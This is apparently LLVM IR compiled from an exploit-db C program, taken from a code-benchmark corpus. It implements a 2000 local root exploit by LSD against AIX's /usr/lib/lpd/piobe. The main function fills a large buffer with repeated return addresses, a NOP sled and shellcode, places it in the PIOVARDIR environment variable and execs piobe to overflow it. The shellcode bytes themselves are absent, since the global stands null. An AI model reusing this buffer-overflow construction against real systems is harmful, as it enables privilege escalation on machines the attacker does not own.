; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_20455.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_20455.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM dec 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [61 x i8] c"/usr/lib/lpd/piobe for aix 4.1 4.2 4.3 4.3.x PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"usage: %s 41|42|43|433\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [18 x i8] c"PIOSTATUSFILE=lsd\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"PIOVARDIR=\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [5 x i8] c"xxx=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [19 x i8] c"/usr/lib/lpd/piobe\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [20000 x i8], align 16
  %9 = alloca [4 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca [4 x i8*], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %5, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %3
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %3
  %25 = load i8**, i8*** %6, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27)
  switch i32 %28, label %41 [
    i32 41, label %29
    i32 42, label %32
    i32 43, label %35
    i32 433, label %38
  ]

29:                                               ; preds = %24
  %30 = load i8*, i8** @shellcode, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 55
  store i8 3, i8* %31, align 1
  store i32 2, i32* %13, align 4
  br label %43

32:                                               ; preds = %24
  %33 = load i8*, i8** @shellcode, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 55
  store i8 2, i8* %34, align 1
  store i32 0, i32* %13, align 4
  br label %43

35:                                               ; preds = %24
  %36 = load i8*, i8** @shellcode, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 55
  store i8 4, i8* %37, align 1
  store i32 0, i32* %13, align 4
  br label %43

38:                                               ; preds = %24
  %39 = load i8*, i8** @shellcode, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 55
  store i8 3, i8* %40, align 1
  store i32 0, i32* %13, align 4
  br label %43

41:                                               ; preds = %24
  %42 = call i32 @exit(i32 -1) #3
  unreachable

43:                                               ; preds = %38, %35, %32, %29
  store i32 0, i32* %12, align 4
  br label %44

44:                                               ; preds = %49, %43
  %45 = load i8**, i8*** %7, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i32 1
  store i8** %46, i8*** %7, align 8
  %47 = load i8*, i8** %45, align 8
  %48 = icmp ne i8* %47, null
  br i1 %48, label %49, label %56

49:                                               ; preds = %44
  %50 = load i8**, i8*** %7, align 8
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = add nsw i32 %52, 1
  %54 = load i32, i32* %12, align 4
  %55 = add nsw i32 %54, %53
  store i32 %55, i32* %12, align 4
  br label %44

56:                                               ; preds = %44
  %57 = load i8**, i8*** %7, align 8
  %58 = ptrtoint i8** %57 to i64
  %59 = load i32, i32* %12, align 4
  %60 = and i32 %59, -4
  %61 = sext i32 %60 to i64
  %62 = add i64 %58, %61
  %63 = sub i64 %62, 8000
  %64 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %65 = bitcast i8* %64 to i64*
  store i64 %63, i64* %65, align 1
  %66 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 0
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i8** %66, align 16
  %67 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  %68 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 1
  store i8* %67, i8** %68, align 8
  %69 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 3500
  %70 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 2
  store i8* %69, i8** %70, align 16
  %71 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 3
  store i8* null, i8** %71, align 8
  %72 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  store i8* %72, i8** %10, align 8
  %73 = load i8*, i8** %10, align 8
  %74 = call i32 @strcpy(i8* %73, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 10
  store i8* %76, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %77

77:                                               ; preds = %84, %56
  %78 = load i32, i32* %12, align 4
  %79 = load i32, i32* %13, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %87

81:                                               ; preds = %77
  %82 = load i8*, i8** %10, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %10, align 8
  store i8 32, i8* %82, align 1
  br label %84

84:                                               ; preds = %81
  %85 = load i32, i32* %12, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %12, align 4
  br label %77

87:                                               ; preds = %77
  store i32 0, i32* %12, align 4
  br label %88

88:                                               ; preds = %100, %87
  %89 = load i32, i32* %12, align 4
  %90 = load i32, i32* @ADRNUM, align 4
  %91 = icmp slt i32 %89, %90
  br i1 %91, label %92, label %103

92:                                               ; preds = %88
  %93 = load i32, i32* %12, align 4
  %94 = srem i32 %93, 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = load i8*, i8** %10, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %10, align 8
  store i8 %97, i8* %98, align 1
  br label %100

100:                                              ; preds = %92
  %101 = load i32, i32* %12, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %12, align 4
  br label %88

103:                                              ; preds = %88
  %104 = load i8*, i8** %10, align 8
  store i8 0, i8* %104, align 1
  %105 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 3500
  store i8* %105, i8** %10, align 8
  %106 = load i8*, i8** %10, align 8
  %107 = call i32 @sprintf(i8* %106, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  %108 = load i8*, i8** %10, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 4
  store i8* %109, i8** %10, align 8
  store i32 0, i32* %12, align 4
  br label %110

110:                                              ; preds = %118, %103
  %111 = load i32, i32* %12, align 4
  %112 = load i32, i32* %13, align 4
  %113 = sub nsw i32 3, %112
  %114 = icmp slt i32 %111, %113
  br i1 %114, label %115, label %121

115:                                              ; preds = %110
  %116 = load i8*, i8** %10, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 1
  store i8* %117, i8** %10, align 8
  store i8 32, i8* %116, align 1
  br label %118

118:                                              ; preds = %115
  %119 = load i32, i32* %12, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %12, align 4
  br label %110

121:                                              ; preds = %110
  store i32 0, i32* %12, align 4
  br label %122

122:                                              ; preds = %136, %121
  %123 = load i32, i32* %12, align 4
  %124 = load i32, i32* @NOPNUM, align 4
  %125 = icmp slt i32 %123, %124
  br i1 %125, label %126, label %139

126:                                              ; preds = %122
  %127 = load i32*, i32** @nop, align 8
  %128 = load i32, i32* %12, align 4
  %129 = srem i32 %128, 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  %132 = load i32, i32* %131, align 4
  %133 = trunc i32 %132 to i8
  %134 = load i8*, i8** %10, align 8
  %135 = getelementptr inbounds i8, i8* %134, i32 1
  store i8* %135, i8** %10, align 8
  store i8 %133, i8* %134, align 1
  br label %136

136:                                              ; preds = %126
  %137 = load i32, i32* %12, align 4
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* %12, align 4
  br label %122

139:                                              ; preds = %122
  store i32 0, i32* %12, align 4
  br label %140

140:                                              ; preds = %153, %139
  %141 = load i32, i32* %12, align 4
  %142 = load i8*, i8** @shellcode, align 8
  %143 = call i32 @strlen(i8* %142)
  %144 = icmp slt i32 %141, %143
  br i1 %144, label %145, label %156

145:                                              ; preds = %140
  %146 = load i8*, i8** @shellcode, align 8
  %147 = load i32, i32* %12, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8, i8* %146, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = load i8*, i8** %10, align 8
  %152 = getelementptr inbounds i8, i8* %151, i32 1
  store i8* %152, i8** %10, align 8
  store i8 %150, i8* %151, align 1
  br label %153

153:                                              ; preds = %145
  %154 = load i32, i32* %12, align 4
  %155 = add nsw i32 %154, 1
  store i32 %155, i32* %12, align 4
  br label %140

156:                                              ; preds = %140
  %157 = getelementptr inbounds [4 x i8*], [4 x i8*]* %11, i64 0, i64 0
  %158 = call i32 @execle(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 0, i8** %157)
  %159 = load i32, i32* %4, align 4
  ret i32 %159
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
